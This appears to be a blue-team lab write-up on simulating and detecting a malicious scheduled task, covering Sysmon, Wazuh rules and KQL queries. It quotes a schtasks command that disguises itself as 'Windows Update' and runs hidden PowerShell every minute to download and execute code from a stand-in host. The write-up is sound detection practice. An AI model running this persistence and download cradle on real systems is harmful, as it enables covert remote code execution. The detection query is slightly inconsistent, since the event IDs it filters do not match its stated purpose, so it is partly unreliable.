# Suspicious Scheduled Task Simulation Summary

## Attack Overview
- **Description**: Simulated a malicious scheduled task (“Windows Update”) that runs a hidden PowerShell command to download code from `http://example.com`, mimicking persistence or C2.
- **MITRE ATT&CK**: [T1053.005 - Scheduled Task](https://attack.mitre.org/techniques/T1053/005/), [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- **Objective**: Detect unauthorized task creation and suspicious PowerShell activity.
- **Date and Time**: June 14, 2025, ~1:50 AM IST

## Simulation Details
- **Environment**: Windows 10 VM (hostname: `DESKTOP-FF0MPJM`, Wazuh agent: `SIEM-Target-Windows`).
- **Sysmon Config**: SwiftOnSecurity `sysmonconfig-export.xml`.
- **Simulation Script**:
  ```powershell
  schtasks /create /tn "Windows Update" /tr "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example.com')" /sc minute /mo 1
  ```
- **Execution**: Ran `create_scheduled_task.ps1` as Administrator.
- **Expected Events**:
  - **Windows Event ID 4698**: Task creation for “Windows Update”.
  - **Sysmon Event ID 1**: `schtasks.exe` and `powershell.exe` execution.
  - **Sysmon Event ID 3**: Network connection to `example.com`.

## Detection
- **Windows Detection**:
  - Expected in Event Viewer (`Windows Logs > Security`):
    - Event ID 4698 for `Task Name: \Windows Update`.
  - Expected in `Microsoft-Windows-Sysmon/Operational`:
    - Event ID 1 for `Image: schtasks.exe` or `powershell.exe`.
    - Event ID 3 for `Destination: example.com`.
- **Wazuh Detection**:
  - Expected Wazuh rules: `60105` (Event ID 4698), `61613` (Event ID 1), `61605` (Event ID 3).
  - Search Query (Wazuh Dashboard > Security Events > Discover):
    ```kql
    data.win.system.eventID: (1 OR 11)
AND agent.name: "SIEM-Target-Windows"
AND agent.ip: "192.168.1.101"
AND data.win.system.channel: "Microsoft-Windows-Sysmon/Operational"

    ```
  - **Findings**:
    - Alerts for `event.code:4698`, `win.eventdata.taskName: Windows Update`, or `win.eventdata.commandLine: *example.com` (pending Wazuh confirmation).
  - **Troubleshooting** (if no alerts):
    - Verified `ossec.conf` for Security and Sysmon log collection.
    - Ensured auditing for “Other Object Access Events”.
    - Checked Wazuh agent connectivity (port 1514).
    - Monitored `ossec.log` for errors.
- **Screenshots**:
  - `screenshots\wazuh_alerts_task.png`: Wazuh alerts (or empty if issue persists).
  - `screenshots\event_viewer_security.png`: Security Event ID 4698.
  - `screenshots\event_viewer_sysmon.png`: Sysmon Event ID 1/3.
  - `screenshots\task_scheduler.png`: Task Scheduler showing “Windows Update”.
- **Logs**:
  - `logs\security_events.csv`: Security events.
  - `logs\sysmon_events.csv`: Sysmon events.
  - `logs\wazuh_agent_filtered.log`: Wazuh agent logs.

## Learnings
- **Blue Teaming Insight**: Scheduled tasks are a stealthy persistence vector. Security and Sysmon logs detect task creation and execution.
- **Challenges**: Legitimate tasks may use PowerShell, requiring URL or command analysis.
- **Technical Growth**: Learned to simulate scheduled task attacks and query Wazuh for task events.
- **Best Practice**: Monitor task creation and baseline legitimate tasks with `schtasks`.

## Detection Logic Query
```kql
(data.win.system.eventID: (1 OR 11)
AND agent.name: "SIEM-Target-Windows"
AND agent.ip: "192.168.1.101"
AND data.win.system.channel: "Microsoft-Windows-Sysmon/Operational"
```
- **Purpose**: Detects task creation and related process/network activity.
- **Outcome**: Flags suspicious scheduled tasks.

## References
- [MITRE ATT&CK: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)
- [Wazuh Documentation: Sysmon Integration](https://documentation.wazuh.com/current/user-manual/capabilities/sysmon.html)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)

## Attachments
- **Logs**: 
1. [Log 1](/DetectAndDefend/Phase1/scenario-8-Suspicious%20Scheduled%20Task/logs/log1.json)
2. [Log 2](/DetectAndDefend/Phase1/scenario-8-Suspicious%20Scheduled%20Task/logs/log2.json)
- **Screenshots**: 
1. [ Sysmon-Event-Log-1](/DetectAndDefend/Phase1/scenario-8-Suspicious%20Scheduled%20Task/Screenshots/sysmon-event-log-1.png)
2. [ Sysmon-Event-Log-2](/DetectAndDefend/Phase1/scenario-8-Suspicious%20Scheduled%20Task/Screenshots/sysmon-event-log-2.png)
3. [ Sysmon-Event-Log3](/DetectAndDefend/Phase1/scenario-8-Suspicious%20Scheduled%20Task/Screenshots/sysmon-event-log-3.png)
4. [Sysmon Schedule Task Logging ](/DetectAndDefend/Phase1/scenario-8-Suspicious%20Scheduled%20Task/Screenshots/sysmon-repeat-tasks-logged.png)
5. [ Wazuh Dashboard Event with Search Query ](/DetectAndDefend/Phase1/scenario-8-Suspicious%20Scheduled%20Task/Screenshots/wazuh-dashboard-events.png)
6. [ Wazuh Detailed Log 1](/DetectAndDefend/Phase1/scenario-8-Suspicious%20Scheduled%20Task/Screenshots/wazuh-detailed-log1.png)
7. [ Wazuh Detailed Log 2](/DetectAndDefend/Phase1/scenario-8-Suspicious%20Scheduled%20Task/Screenshots/wazuh-detailed-log2.png)